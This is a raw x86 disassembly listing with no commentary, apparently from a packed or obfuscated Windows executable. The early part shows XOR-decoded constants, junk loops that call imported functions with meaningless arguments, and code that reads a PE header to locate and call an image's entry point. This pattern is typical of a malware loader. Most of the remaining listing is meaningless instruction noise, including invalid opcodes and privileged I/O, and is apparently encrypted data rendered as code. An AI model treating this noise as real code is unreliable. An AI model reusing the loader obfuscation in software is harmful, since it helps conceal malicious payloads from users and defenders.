  409692:	add    ebx,edi
  409694:	lea    ecx,[ecx+edx*1+0x9757d1]
  40969b:	cmp    ebx,ecx
  40969d:	ja     0x4096fe
  4096a3:	mov    eax,DWORD PTR [ebp-0x4]
  4096a6:	xor    eax,esi
  4096a8:	lea    eax,[eax+ebx*1+0x32729b]
  4096af:	push   eax
  4096b0:	mov    eax,DWORD PTR [ebp-0xc]
  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e7c4
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x43045d,0x14
  4098db:	cmp    DWORD PTR ds:0x43045d,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x43045d,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42ec33
  40991f:	mov    eax,ds:0x43045d
  409924:	dec    eax
  409925:	mov    ds:0x43045d,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x4304d7
  409934:	or     eax,DWORD PTR ds:0x4304df
  40993a:	mov    ds:0x4304d7,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e7d0,0x13
  40994c:	cmp    DWORD PTR ds:0x42e7d0,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e7d0,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42ec37
  409979:	mov    ecx,DWORD PTR ds:0x42e7d0
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e7d0,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x430449,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x430459,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x4304cf,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x4304cf
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x4304cf,edi
  4099bf:	cmp    DWORD PTR ds:0x4304cf,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x43043d
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42eac7
  4099e8:	cmp    DWORD PTR ds:0x4304cf,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x4304cf
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x4304cf,edi
  409a02:	cmp    DWORD PTR ds:0x4304cf,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x4304df,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x430435,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x430435
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x430435,ebx
  409a35:	cmp    DWORD PTR ds:0x430435,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42ea03
  409a50:	cmp    DWORD PTR ds:0x430435,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x430435
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x430435,ebx
  409a6a:	cmp    DWORD PTR ds:0x430435,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e7c8
  409a7d:	or     DWORD PTR ds:0x42edcb,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	mov    ah,0x3a
  409a96:	out    0x5a,al
  409a98:	pop    ecx
  409a99:	fdivr  QWORD PTR [esi+0x7e]
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409a31
  409aa1:	aad    0x8d
  409aa3:	lods   al,BYTE PTR ds:[esi]
  409aa4:	repnz addr16 dec esi
  409aa7:	iret   
  409aa8:	int3   
  409aa9:	pop    ebp
  409aaa:	dec    ecx
  409aab:	mov    dh,0x5d
  409aad:	add    cl,BYTE PTR ds:0xaf8495f4
  409ab3:	frstor [edi+0x25]
  409ab6:	lds    edi,FWORD PTR [ebp-0x32]
  409ab9:	scas   eax,DWORD PTR es:[edi]
  409aba:	sbb    ebp,DWORD PTR [ecx]
  409abc:	add    ah,0xbe
  409abf:	adc    al,BYTE PTR [ebx+eiz*1]
  409ac2:	adc    BYTE PTR [eax],dh
  409ac4:	popf   
  409ac5:	mov    BYTE PTR [edi*4+0x3ceb8237],bl
  409acc:	das    
  409acd:	and    eax,0xba0301a1
  409ad2:	add    bl,BYTE PTR [esi-0x4c171548]
  409ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ad9:	shl    DWORD PTR [edx-0x57],cl
  409adc:	fld    DWORD PTR [eax+0x15]
  409adf:	das    
  409ae0:	std    
  409ae1:	leave  
  409ae2:	retf   
  409ae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ae4:	mov    ebx,0x271f4ad3
  409ae9:	pop    ecx
  409aea:	or     ah,BYTE PTR ds:0xf1eeccbf
  409af0:	cs popf 
  409af2:	jecxz  0x409b51
  409af4:	cli    
  409af5:	add    al,BYTE PTR [eax+ebx*8]
  409af8:	(bad)  
  409af9:	cmc    
  409afa:	mov    bl,0xae
  409afc:	cs mov esi,0x6954a529
  409b02:	add    DWORD PTR [edi-0x547bfa6a],ecx
  409b08:	in     eax,0x7a
  409b0a:	xchg   edi,eax
  409b0b:	or     BYTE PTR [edx+0x6],dh
  409b0e:	adc    DWORD PTR [eax-0x6e],esp
  409b11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b12:	arpl   WORD PTR [ecx+eax*1],dx
  409b15:	adc    eax,0xdd7cbcda
  409b1a:	mov    ebp,0x6f74bfeb
  409b1f:	gs repz mov ch,0x8a
  409b23:	mov    DWORD PTR [ebx],ecx
  409b25:	or     al,0x10
  409b27:	inc    edi
  409b28:	add    esp,DWORD PTR [edi+0x3d]
  409b2b:	test   eax,0xe2e21600
  409b30:	into   
  409b31:	cmp    ebp,DWORD PTR [ebx]
  409b33:	xor    bh,BYTE PTR [esi+0x7]
  409b36:	adc    ebx,DWORD PTR ds:0x2170c74d
  409b3c:	je     0x409ba1
  409b3e:	lods   eax,DWORD PTR ds:[esi]
  409b3f:	jmp    0xabda:0x322951c5
  409b46:	pop    ss
  409b47:	and    DWORD PTR [edi-0x1c],ebx
  409b4a:	pusha  
  409b4b:	shr    DWORD PTR [esi-0x5a],0x1c
  409b4f:	dec    ebp
  409b50:	loope  0x409b14
  409b52:	popf   
  409b53:	hlt    
  409b54:	shl    BYTE PTR [ecx+0x4dda943],1
  409b5a:	pushf  
  409b5b:	popf   
  409b5c:	pop    es
  409b5d:	xor    ebx,DWORD PTR [ecx]
  409b5f:	push   0x11
  409b61:	leave  
  409b62:	js     0x409bd6
  409b64:	stos   BYTE PTR es:[edi],al
  409b65:	ficom  DWORD PTR [eax+0x7efc5ae9]
  409b6b:	sub    eax,0x406f6d79
  409b70:	or     ecx,DWORD PTR [ebp+0x3f7e6bbc]
  409b76:	push   0x9dc0617f
  409b7b:	iret   
  409b7c:	scas   al,BYTE PTR es:[edi]
  409b7d:	je     0x409b5a
  409b7f:	mov    ebx,0x48f94e80
  409b84:	jne    0x409ba0
  409b86:	fisub  WORD PTR [edi-0x1e]
  409b89:	mov    ds:0x7194cb50,eax
  409b8e:	sub    bh,bl
  409b90:	sbb    ah,BYTE PTR [eax]
  409b92:	xchg   esp,eax
  409b93:	arpl   WORD PTR [ebp+0x2e],di
  409b96:	enter  0x65e,0x5
  409b9a:	add    eax,0x3c20220c
  409b9f:	out    dx,al
  409ba0:	push   esp
  409ba1:	sar    BYTE PTR [eax],1
  409ba3:	dec    edi
  409ba4:	enter  0xe11a,0xb9
  409ba8:	inc    edi
  409ba9:	aad    0x3d
  409bab:	sub    esi,edi
  409bad:	jmp    0x83f07d43
  409bb2:	loopne 0x409ba1
  409bb4:	retf   0x8138
  409bb7:	iret   
  409bb8:	ror    edi,1
  409bba:	(bad)  
  409bbc:	cmc    
  409bbd:	xchg   esp,eax
  409bbe:	cmp    al,0x39
  409bc0:	fs call 0xb818:0xfc8d0de0
  409bc8:	mov    ecx,0xf0361acb
  409bcd:	arpl   WORD PTR [ebx+eiz*4+0x2c],dx
  409bd1:	or     eax,0x79c77261
  409bd6:	(bad)  
  409bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bd8:	and    ebx,DWORD PTR [eax-0x19f601b3]
  409bde:	call   0x29b0320c
  409be3:	dec    esp
  409be4:	stc    
  409be5:	mov    al,0x5d
  409be7:	jg     0x409b79
  409be9:	xchg   ecx,eax
  409bea:	retf   0x9537
  409bed:	(bad)  
  409bee:	(bad)  
  409bef:	mov    ecx,0x54ccabfe
  409bf4:	loop   0x409b83
  409bf6:	jb     0x409c6d
  409bf8:	jg     0x409bbd
  409bfa:	(bad)
  409bfd:	repnz mov WORD PTR gs:[esi],ds
  409c01:	fs dec dl
  409c04:	add    esi,DWORD PTR [esi-0x35]
  409c07:	ins    DWORD PTR es:[edi],dx
  409c08:	mov    al,ds:0x895b5b1c
  409c0d:	sub    al,0x81
  409c0f:	and    DWORD PTR [eax],0xffffffe2
  409c12:	pcmpeqb mm4,mm2
  409c15:	std    
  409c16:	pop    eax
  409c17:	(bad)  
  409c18:	and    dl,dl
  409c1a:	std    
  409c1b:	dec    esi
  409c1c:	adc    DWORD PTR [ebp+0x22],edx
  409c1f:	aam    0x1d
  409c21:	and    al,0xcf
  409c23:	mov    ds:0xf7cf9d2e,al
  409c28:	xchg   esp,eax
  409c29:	push   0xffffff97
  409c2b:	das    
  409c2c:	mov    cl,0x9a
  409c2e:	sub    WORD PTR [edi-0x3ef70409],si
  409c35:	jae    0x409c09
  409c37:	sbb    al,0x55
  409c39:	inc    BYTE PTR [eax+0x48]
  409c3c:	out    0x54,al
  409c3e:	pop    esi
  409c3f:	leave  
  409c40:	jl     0x409bc5
  409c42:	lock pop ds
  409c44:	mov    cs,WORD PTR [esi+esi*8-0x37]
  409c48:	sub    dl,bh
  409c4a:	aad    0x70
  409c4c:	pop    eax
  409c4d:	mov    ecx,DWORD PTR [edi]
  409c4f:	adc    esi,DWORD PTR [eax+0x2c]
  409c52:	push   edi
  409c53:	popa   
  409c54:	leave  
  409c55:	sbb    BYTE PTR [eax+edi*4+0x23c3809],bl
  409c5c:	aas    
  409c5d:	mov    edi,0x7899b4ac
  409c62:	popa   
  409c63:	xor    eax,0xf125547b
  409c68:	test   eax,0x8f6db9cb
  409c6d:	xchg   ecx,eax
  409c6e:	push   cs
  409c6f:	or     al,0x94
  409c71:	(bad)  
  409c73:	mov    esp,0xdd9f338a
  409c78:	dec    edi
  409c79:	nop
  409c7a:	adc    DWORD PTR [esi],ebp
  409c7c:	xor    eax,0x37f217ba
  409c81:	pop    ss
  409c82:	es sub edx,DWORD PTR gs:[ecx]
  409c86:	mov    ah,0x2
  409c88:	jae    0x409c87
  409c8a:	mov    ch,0x69
  409c8c:	pop    ebx
  409c8d:	mov    ds:0xf20f6aec,al
  409c92:	daa    
  409c93:	mov    bl,0x5a
  409c95:	push   ss
  409c96:	xchg   ecx,eax
  409c97:	cmp    BYTE PTR [edi+0x5cb46c9c],cl
  409c9d:	mov    dh,0xe1
  409c9f:	mov    al,ds:0x3125cbf8
  409ca4:	adc    ah,al
  409ca6:	pop    ecx
  409ca7:	xor    ebp,DWORD PTR [esi-0x70]
  409caa:	xor    cl,BYTE PTR [edx]
  409cac:	push   eax
  409cad:	(bad)  
  409cae:	xchg   ebx,eax
  409caf:	mov    ah,0x6f
  409cb1:	add    al,0x1e
  409cb3:	mov    bh,al
  409cb5:	jmp    0x1735033b
  409cba:	add    edi,eax
  409cbc:	leave  
  409cbd:	mov    eax,0xa67683cf
  409cc2:	data16 jb 0x409c50
  409cc5:	call   0xa9525486
  409cca:	jmp    0x409caa
  409ccc:	jge    0x409d24
  409cce:	leave  
  409ccf:	mov    ebx,0x176b5bf3
  409cd4:	aas    
  409cd5:	sbb    al,0xea
  409cd7:	sbb    BYTE PTR [edi-0x2ab02413],cl
  409cdd:	out    dx,al
  409cde:	push   ecx
  409cdf:	int3   
  409ce0:	ja     0x409d5b
  409ce2:	pop    ebp
  409ce3:	sbb    DWORD PTR [edi-0x73],0xfffffffc
  409ce7:	imul   ebp,DWORD PTR [edi],0x1bedb519
  409ced:	out    0x8d,al
  409cef:	scas   al,BYTE PTR es:[edi]
  409cf0:	lock enter 0x5dbd,0xcf
  409cf5:	int3   
  409cf6:	jmp    0xbb12dea2
  409cfb:	or     esi,DWORD PTR [ebp+eax*1-0x4eca1fc4]
  409d02:	lods   eax,DWORD PTR ds:[esi]
  409d03:	loop   0x409ca1
  409d05:	shl    DWORD PTR [eax-0x610dd1c3],0x9f
  409d0c:	add    ch,BYTE PTR [edx]
  409d0e:	mov    WORD PTR [esp+edi*4-0x11],ds
  409d12:	je     0x409d10
  409d14:	outs   dx,DWORD PTR ds:[esi]
  409d15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d16:	jge    0x409c99
  409d18:	out    dx,al
  409d19:	fsub   QWORD PTR [ecx+0x35]
  409d1c:	inc    edi
  409d1d:	jle    0x409cc7
  409d1f:	jecxz  0x409ce0
  409d21:	add    BYTE PTR [ecx-0x59bc8854],ah
  409d27:	sti    
  409d28:	sbb    dh,al
  409d2a:	(bad)  
  409d2b:	cmp    DWORD PTR [esp+esi*1-0x3b225e72],ebp
  409d32:	sub    edx,DWORD PTR [eax-0x9e07f29]
  409d38:	ficom  DWORD PTR [esi]
  409d3a:	mov    dl,0x47
  409d3c:	adc    eax,0x745a2e9c
  409d41:	lods   eax,DWORD PTR ds:[esi]
  409d42:	inc    esi
  409d43:	push   ebp
  409d44:	scas   al,BYTE PTR es:[edi]
  409d45:	ret    0xabe5
  409d48:	add    BYTE PTR [eax],bl
  409d4a:	push   ss
  409d4b:	scas   eax,DWORD PTR es:[edi]
  409d4c:	enter  0xd6d6,0xb3
  409d50:	sub    edi,DWORD PTR [esi]
  409d52:	or     BYTE PTR [ebp+0xe],bh
  409d55:	mov    al,ds:0x2f685f0f
  409d5a:	retf   0x5f55
  409d5d:	lds    edi,FWORD PTR [eax+0x529a8d3a]
  409d63:	call   0x5a5f30f9
  409d68:	mov    dh,0xfc
  409d6a:	std    
  409d6b:	jnp    0x409d8e
  409d6d:	imul   edi,DWORD PTR [edi],0x8197ff14
  409d73:	sbb    BYTE PTR [eax+ebx*2-0x14],0xf0
  409d78:	xor    BYTE PTR [edi+0x34e6f690],ch
  409d7e:	rcl    BYTE PTR [ebx+0x588b9c74],0x9a
  409d85:	pop    eax
  409d86:	lahf   
  409d87:	in     eax,dx
  409d88:	sub    DWORD PTR [edi],edx
  409d8a:	adc    al,BYTE PTR [ecx-0x4f]
  409d8d:	xlat   BYTE PTR ds:[ebx]
  409d8e:	scas   al,BYTE PTR es:[edi]
  409d8f:	arpl   WORD PTR [esi+0x6a],di
  409d92:	mov    bh,0x31
  409d94:	call   0xbf3cdd15
  409d99:	shl    bl,cl
  409d9b:	rol    DWORD PTR [ecx],cl
  409d9d:	loop   0x409e0f
  409d9f:	lods   al,BYTE PTR ds:[esi]
  409da0:	pop    ebx
  409da1:	dec    eax
  409da2:	les    edi,FWORD PTR gs:[edx]
  409da5:	push   ds
  409da6:	sbb    DWORD PTR [edx],ebx
  409da8:	push   eax
  409da9:	pushf  
  409daa:	cmp    ecx,DWORD PTR [ecx]
  409dac:	jge    0x409db4
  409dae:	leave  
  409daf:	mov    ds:0xb48d395e,al
  409db4:	mov    ds:0x8097b8e,eax
  409db9:	out    dx,al
  409dba:	push   esp
  409dbb:	out    0x29,eax
  409dbd:	les    eax,FWORD PTR [esi-0x44]
  409dc0:	loope  0x409d7e
  409dc2:	sbb    ch,BYTE PTR [esi+ebx*2+0x49]
  409dc6:	mov    bh,0x80
  409dc8:	mov    DWORD PTR [edi-0x51],edi
  409dcb:	cmp    BYTE PTR [ecx+0x5a],0xc
  409dcf:	xchg   ebp,eax
  409dd0:	add    eax,edi
  409dd2:	mov    ebx,DWORD PTR ds:0x42e7d8
  409dd8:	add    ebx,DWORD PTR ds:0x4304d7
  409dde:	mov    DWORD PTR ds:0x42e7d8,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x43045d,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x4304cf,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x430451
  409e03:	and    DWORD PTR ds:0x430471,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x43044d,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409e76
  409e2b:	dec    BYTE PTR [esi+0x21]
  409e2e:	or     eax,ebx
  409e30:	jle    0x409eb0
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409e8c
  409e37:	sub    al,0xdd
  409e39:	aaa    
  409e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e3b:	sbb    ah,BYTE PTR [eax+0x68]
  409e3e:	xor    BYTE PTR [ecx+ecx*2],ch
  409e41:	rcr    BYTE PTR ds:0x2508c03b,1
  409e47:	lock inc ecx
  409e49:	int3   
  409e4a:	mov    ebx,0xc90761a0
  409e4f:	ficomp DWORD PTR [ebp+0x2b970eb3]
  409e55:	into   
  409e56:	sbb    eax,0xc56ffcc3
  409e5b:	fiadd  DWORD PTR [ebp+eiz*1-0x6fdfdce]
  409e62:	push   ss
  409e63:	push   ebx
  409e64:	cmp    eax,0xb15970ae
  409e69:	pop    edx
  409e6a:	loop   0x409e70
  409e6c:	bound  esi,QWORD PTR [eax]
  409e6e:	neg    ah
  409e70:	(bad)  
  409e71:	aad    0xeb
  409e73:	mov    bl,0x14
  409e75:	loop   0x409ec4
  409e77:	shl    eax,1
  409e79:	push   edx
  409e7a:	sub    DWORD PTR [esp+ebp*4+0x412930b9],0xffffffff
  409e82:	push   ebp
  409e83:	loopne 0x409ea6
  409e85:	scas   al,BYTE PTR es:[edi]
  409e86:	pop    ebx
  409e87:	outs   dx,DWORD PTR ds:[esi]
  409e88:	push   cs
  409e89:	adc    esp,DWORD PTR [ecx+0x10052648]
  409e8f:	and    edx,DWORD PTR [ecx]
  409e91:	xor    DWORD PTR [ebx-0x5d128f2],edi
  409e97:	mov    esi,0x4bba1811
  409e9c:	icebp  
  409e9d:	in     eax,dx
  409e9e:	in     al,0x3e
  409ea0:	in     eax,0xd9
  409ea2:	or     ebx,DWORD PTR [edi-0x6b33e938]
  409ea8:	sahf   
  409ea9:	inc    ebx
  409eaa:	es mov al,0x20
  409ead:	lds    edx,FWORD PTR [eax-0x6f1e7e6c]
  409eb3:	mov    ds:0xcfb5970d,eax
  409eb8:	(bad)  
  409eb9:	push   edi
  409eba:	add    BYTE PTR [edi-0x53],al
  409ebd:	mov    esp,0x69dcd997
  409ec2:	clc    
  409ec3:	fcom   DWORD PTR [esi]
  409ec5:	pop    edi
  409ec6:	shr    BYTE PTR [edi],0x93
  409ec9:	scas   eax,DWORD PTR es:[edi]
  409eca:	test   BYTE PTR [eax-0x64],al
  409ecd:	outs   dx,BYTE PTR ds:[esi]
  409ece:	sub    esp,ecx
  409ed0:	xchg   esp,eax
  409ed1:	mov    dh,0x4e
  409ed3:	loopne 0x409f32
  409ed5:	mov    dh,0x12
  409ed7:	add    BYTE PTR [ebp-0x16],cl
  409eda:	lds    esp,FWORD PTR [esi+esi*2]
  409edd:	sbb    al,BYTE PTR [edx-0x22]
  409ee0:	push   ds
  409ee1:	repnz mov bl,0x6e
  409ee4:	imul   ecx,eax,0x1c72a7d
  409eea:	sbb    edi,ecx
  409eec:	pusha  
  409eed:	cli    
  409eee:	sbb    eax,0xfea2755c
  409ef3:	cmc    
  409ef4:	or     DWORD PTR [eax+0x187dabf4],eax
  409efa:	sub    DWORD PTR [edx-0x55],0xffffffe7
  409efe:	sub    BYTE PTR [eax+0x494a0242],dl
  409f04:	xchg   DWORD PTR [ebp-0x37cff1a4],edx
  409f0a:	add    eax,0x352f8292
  409f0f:	stos   DWORD PTR es:[edi],eax
  409f10:	xchg   ebx,eax
  409f11:	(bad)  
  409f12:	jae    0x409ea2
  409f14:	mov    bh,0x2b
  409f16:	aad    0x7
  409f18:	cmc    
  409f19:	mov    al,0xda
  409f1b:	xchg   ebx,eax
  409f1c:	sbb    BYTE PTR [eax+edi*4-0xb],0x14
  409f21:	add    al,0xea
  409f23:	inc    ecx
  409f24:	dec    esi
  409f25:	aaa    
  409f26:	mov    ch,0x58
  409f28:	cmp    DWORD PTR [ebx],eax
  409f2a:	pop    fs
  409f2c:	loope  0x409f53
  409f2e:	or     al,0x43
  409f30:	jecxz  0x409fa1
  409f32:	mov    eax,ds:0x9ff2558c
  409f37:	or     al,0x4e
  409f39:	pop    es
  409f3a:	pop    esp
  409f3b:	push   0x4a172fcd
  409f40:	mov    cl,0x1
  409f42:	and    eax,0x65c3b9ff
  409f47:	pop    eax
  409f48:	ds retf 
  409f4a:	inc    esi
  409f4b:	xchg   edi,eax
  409f4c:	dec    ebp
  409f4d:	mov    eax,ds:0xf12adca7
  409f52:	clc    
  409f53:	cmc    
  409f54:	adc    al,ah
  409f56:	dec    esi
  409f57:	push   es
  409f58:	add    DWORD PTR [edx+edi*1-0x38],0xa68704c5
